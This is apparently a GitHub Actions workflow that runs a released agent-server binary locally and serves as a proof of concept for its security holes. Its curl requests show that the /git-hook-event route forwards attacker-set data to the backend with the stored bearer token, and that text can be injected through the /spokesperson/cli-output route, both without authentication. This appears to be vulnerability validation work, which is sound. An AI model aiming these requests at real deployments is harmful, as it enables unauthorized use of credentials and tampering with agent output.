name: Box guest unauth impact v2
on:
  pull_request:
    branches: [main]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  validate-local:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - name: Validate exact production guest binary locally
        shell: bash
        run: |
          set -euo pipefail
          O=box-guest-unauth-impact-v2.txt
          : > "$O"
          rm -rf /tmp/boxguest2 && mkdir -p /tmp/boxguest2/work
          tag=agent-server-v0.0.49-ascii-prod29
          curl -fL "https://github.com/ariana-dot-dev/agent-server/releases/download/$tag/ascii-agents-server-linux-x64" -o /tmp/boxguest2/agent
          chmod +x /tmp/boxguest2/agent

          # Claude Code SDK invokes this executable after the session is constructed.
          # Keep that invocation alive so currentCycleId remains set long enough to
          # exercise the concurrent unauthenticated cli-output route.
          cat >/tmp/boxguest2/fake-claude <<'SH'
          #!/usr/bin/env bash
          echo "ARGS:$*" >>/tmp/boxguest2/fake-claude.log
          if [[ " $* " == *" --version "* ]]; then echo '2.1.0'; exit 0; fi
          cat >/tmp/boxguest2/fake-claude.stdin 2>/dev/null & reader=$!
          sleep 12
          kill "$reader" 2>/dev/null || true
          exit 0
          SH
          chmod +x /tmp/boxguest2/fake-claude

          cat >/tmp/boxguest2/crypto.js <<'JS'
          const c=require('crypto'); const [mode,secret,input]=process.argv.slice(2); const key=c.createHash('sha256').update(secret).digest();
          if(mode==='enc'){const iv=c.randomBytes(16),x=c.createCipheriv('aes-256-gcm',key,iv),pt=JSON.stringify({authKey:secret,data:JSON.parse(input)}),ct=Buffer.concat([x.update(pt,'utf8'),x.final()]); process.stdout.write(Buffer.concat([iv,x.getAuthTag(),ct]).toString('base64'));}
          else {const raw=Buffer.from(input,'base64'),iv=raw.subarray(0,16),tag=raw.subarray(16,32),ct=raw.subarray(32),d=c.createDecipheriv('aes-256-gcm',key,iv);d.setAuthTag(tag);process.stdout.write(Buffer.concat([d.update(ct),d.final()]).toString('utf8'));}
          JS
          enc(){ node /tmp/boxguest2/crypto.js enc "$SHARED_KEY" "$1"; }
          decfile(){ local f="$1"; jq -r '.encrypted // empty' "$f" | xargs -r -I{} node /tmp/boxguest2/crypto.js dec "$SHARED_KEY" '{}'; }

          cat >/tmp/boxguest2/backend.py <<'PY'
          from http.server import BaseHTTPRequestHandler,HTTPServer
          import json
          class H(BaseHTTPRequestHandler):
            def do_POST(self):
              n=int(self.headers.get('content-length','0')); b=self.rfile.read(n)
              with open('/tmp/boxguest2/backend-capture.txt','a') as f:
                f.write('PATH='+self.path+'\nAUTH='+self.headers.get('authorization','')+'\nBODY='+b.decode('utf-8','replace')+'\n')
              out=json.dumps({'exitCode':37}).encode()
              self.send_response(200); self.send_header('Content-Type','application/json'); self.send_header('Content-Length',str(len(out))); self.end_headers(); self.wfile.write(out)
            def log_message(self,*a): pass
          HTTPServer(('127.0.0.1',19091),H).serve_forever()
          PY
          python3 /tmp/boxguest2/backend.py >/tmp/boxguest2/backend.log 2>&1 & bpid=$!

          export MACHINE_ID=box-node-test-impact2
          export SHARED_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef
          export WORK_DIR=/tmp/boxguest2/work HOME=/tmp/boxguest2/work ASCII_PORT=18912 IS_SANDBOX=1
          export BACKEND_URL=http://127.0.0.1:19091 BOX_CLI_API_URL=http://127.0.0.1:19091
          export ASCII_API_URL=http://127.0.0.1:19091 ASCII_TOKEN=LOCAL_BACKEND_TOKEN_MARKER
          export CLAUDE_PATH=/tmp/boxguest2/fake-claude NO_PROXY=127.0.0.1,localhost
          /tmp/boxguest2/agent >/tmp/boxguest2/agent.log 2>&1 & apid=$!
          cleanup(){ kill "$apid" "$bpid" 2>/dev/null || true; wait "$apid" "$bpid" 2>/dev/null || true; }; trap cleanup EXIT
          for i in $(seq 1 100); do curl -sS --max-time 1 http://127.0.0.1:18912/health >/dev/null 2>&1 && break; kill -0 "$apid" 2>/dev/null || break; sleep .2; done

          echo "TAG=$tag" >> "$O"
          echo "SHA256=$(sha256sum /tmp/boxguest2/agent|awk '{print $1}')" >> "$O"

          # Protected sibling proves the test is not accidentally bypassing the envelope gate globally.
          c=$(curl -sS --max-time 3 -o /tmp/boxguest2/control -w '%{http_code}' -X POST http://127.0.0.1:18912/spokesperson/interrupt -H 'Content-Type: application/json' --data-binary '{"x":1}' || true)
          echo "CONTROL_interrupt_no_auth status=$c body=$(cat /tmp/boxguest2/control)" >> "$O"

          # Prove git-hook is an unauthenticated credentialed relay independently of /start.
          : >/tmp/boxguest2/backend-capture.txt
          hook='{"hookType":"pre_commit","repoPath":"ATTACKER_CONTROLLED_REPOPATH","branch":"ATTACKER_BRANCH","stagedFiles":["ATTACKER_FILE"]}'
          hc=$(curl -sS --max-time 5 -o /tmp/boxguest2/hook.json -w '%{http_code}' -X POST http://127.0.0.1:18912/git-hook-event -H 'Content-Type: application/json' --data-binary "$hook" || true)
          echo "git_hook_unauth status=$hc body=$(cat /tmp/boxguest2/hook.json)" >> "$O"
          cat /tmp/boxguest2/backend-capture.txt >> "$O" || true
          if grep -q '^AUTH=Bearer LOCAL_BACKEND_TOKEN_MARKER$' /tmp/boxguest2/backend-capture.txt && grep -q 'ATTACKER_CONTROLLED_REPOPATH' /tmp/boxguest2/backend-capture.txt && grep -q '37' /tmp/boxguest2/hook.json; then
            echo 'GIT_HOOK_CREDENTIALLED_RELAY=CONFIRMED' >> "$O"
          else
            echo 'GIT_HOOK_CREDENTIALLED_RELAY=NOT_CONFIRMED' >> "$O"
          fi

          # Initialize the real agent state with a valid provider/model configuration.
          start_data='{"oneToken":"LOCAL_BACKEND_TOKEN_MARKER","agentType":"claude-code","productMode":"box","clearConversation":true,"modelsConfig":{"claude-code":{"default":"claude-sonnet-4-6","utility":"claude-sonnet-4-6","models":[{"id":"claude-sonnet-4-6","label":"Sonnet","sdkId":"claude-sonnet-4-6"}]}}}'
          start_enc=$(enc "$start_data")
          sc=$(curl -sS --max-time 30 -o /tmp/boxguest2/start.json -w '%{http_code}' -X POST http://127.0.0.1:18912/start -H 'Content-Type: application/json' --data-binary "{\"encrypted\":\"$start_enc\"}" || true)
          echo "start_status=$sc" >> "$O"
          echo "start_decrypted=$(decfile /tmp/boxguest2/start.json 2>/dev/null || cat /tmp/boxguest2/start.json)" >> "$O"

          # Pre-create/cache the spokesperson adapter so runCycle sets currentCycleId
          # before the SDK process begins. This removes the session-construction race.
          group=boxsec-precreated-cycle
          state='{"conversationId":"boxsec-precreated-cycle","messages":[],"pastConversations":[]}'
          switch_data=$(jq -nc --arg g "$group" --argjson s "$state" '{incomingGroupId:$g,incomingState:$s,incomingProviderType:"claude-code"}')
          switch_enc=$(enc "$switch_data")
          sw=$(curl -sS --max-time 30 -o /tmp/boxguest2/switch.json -w '%{http_code}' -X POST http://127.0.0.1:18912/spokesperson/switch -H 'Content-Type: application/json' --data-binary "{\"encrypted\":\"$switch_enc\"}" || true)
          echo "switch_status=$sw" >> "$O"
          echo "switch_decrypted=$(decfile /tmp/boxguest2/switch.json 2>/dev/null || cat /tmp/boxguest2/switch.json)" >> "$O"

          cycle_data=$(jq -nc --arg g "$group" '{conversationGroupId:$g,cyclePrompt:"local validation only"}')
          cycle_enc=$(enc "$cycle_data")
          curl -sS --max-time 40 -o /tmp/boxguest2/cycle.json -w '%{http_code}' -X POST http://127.0.0.1:18912/spokesperson/cycle -H 'Content-Type: application/json' --data-binary "{\"encrypted\":\"$cycle_enc\"}" >/tmp/boxguest2/cycle.status & cpid=$!

          injected=0; code=none
          for i in $(seq 1 160); do
            code=$(curl -sS --max-time 1 -o /tmp/boxguest2/inject.body -w '%{http_code}' -X POST http://127.0.0.1:18912/spokesperson/cli-output -H 'Content-Type: application/json' --data-binary '{"kind":"say","content":"BOXSEC_UNAUTH_MARKER"}' 2>/dev/null || true)
            if [ "$code" = 200 ]; then injected=1; break; fi
            sleep .05
          done
          echo "unauth_cli_injection_accepted=$injected status=$code body=$(cat /tmp/boxguest2/inject.body 2>/dev/null || true)" >> "$O"
          wait "$cpid" || true
          echo "cycle_http_status=$(cat /tmp/boxguest2/cycle.status 2>/dev/null || true)" >> "$O"
          dec=$(decfile /tmp/boxguest2/cycle.json 2>/dev/null || true)
          echo "cycle_decrypted=$dec" >> "$O"
          if [ "$injected" = 1 ] && printf '%s' "$dec" | grep -q 'BOXSEC_UNAUTH_MARKER'; then echo 'SPOKESPERSON_OUTPUT_INJECTION=CONFIRMED' >> "$O"; else echo 'SPOKESPERSON_OUTPUT_INJECTION=NOT_CONFIRMED' >> "$O"; fi

          echo '=== targeted agent log ===' >> "$O"
          grep -Eai 'START|GIT-HOOK|spokesperson|Claude:|FAILED TO INITIALIZE|processMessage|cycle error' /tmp/boxguest2/agent.log | tail -n 300 >> "$O" || true
          echo '=== fake claude ===' >> "$O"
          cat /tmp/boxguest2/fake-claude.log >> "$O" 2>/dev/null || true
          cat "$O"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: box-guest-unauth-impact-v2
          path: box-guest-unauth-impact-v2.txt
          if-no-files-found: warn